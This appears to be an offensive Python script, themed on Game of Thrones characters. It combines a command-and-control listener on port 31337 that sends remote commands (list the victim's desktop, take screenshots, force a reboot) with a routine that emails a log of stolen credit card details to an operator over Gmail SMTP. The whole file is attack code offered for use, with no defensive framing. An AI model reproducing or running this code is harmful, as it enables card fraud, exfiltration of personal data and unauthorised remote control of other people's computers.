import smtplib
import mimetypes
from email.message import EmailMessage
import socket
import os

def send_mail_to_Tyrion():
    message = EmailMessage()
    sender = "Varys@7kindoms.net"
    recipient = "mail_to_send_to@whatever.com" #mail to send to
    message['From'] = sender
    message['To'] = recipient
    message['Subject'] = 'Tyrion!!! Are you Master of coins or what?!'
    body = """Another naive just entered credit card credentials, see attachment below. Regards, Lord Varys"""
    message.set_content(body)
    mime_type, _ = mimetypes.guess_type('cc_log.txt')
    mime_type, mime_subtype = mime_type.split('/')
    with open('cc_log.txt', 'rb') as file:
     message.add_attachment(file.read(),
     maintype=mime_type,
     subtype=mime_subtype,
     filename='cc_log.txt')
    print(message)
    mail_server = smtplib.SMTP_SSL('smtp.gmail.com')     #if you wanna use gmail SMTP
    mail_server.set_debuglevel(1)
    mail_server.login("your@gmail.com", 'yourpassword') #less security needed for gmail https://myaccount.google.com/lesssecureapps
    mail_server.send_message(message)
    mail_server.quit()

class SpyDo:
    def desktopDir(self):
        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') #for WinOS only
        results = f'dir {desktop}'
        return results

    def alarm111(self):
        try:
            os.system("shutdown -t 0 -r -f")  # for Win OS
        except:
            os.system('reboot now')  # for most *nix OS
        finally:
            print('unknown OS, restart failed, manual destroying PC required ')


def my_server():

    SERVER_HOST = "0.0.0.0"
    SERVER_PORT = 31337

    BUFFER_SIZE = 1024

    s = socket.socket()

    s.bind((SERVER_HOST, SERVER_PORT))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen(5)
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

    client_socket, client_address = s.accept()
    print(f"{client_address[0]}:{client_address[1]} Connected!")

    while True:
        command = input("[1] List desktop folder\n[2] Make screenshot\n[3] Alarm! Panic! Restart client PC now!!!111\nEnter the command you wanna execute: ")
        client_socket.send(command.encode())
        if command.lower() == "exitnow":
            break
        results = client_socket.recv(BUFFER_SIZE).decode()
        print(results)
    client_socket.close()
    s.close()




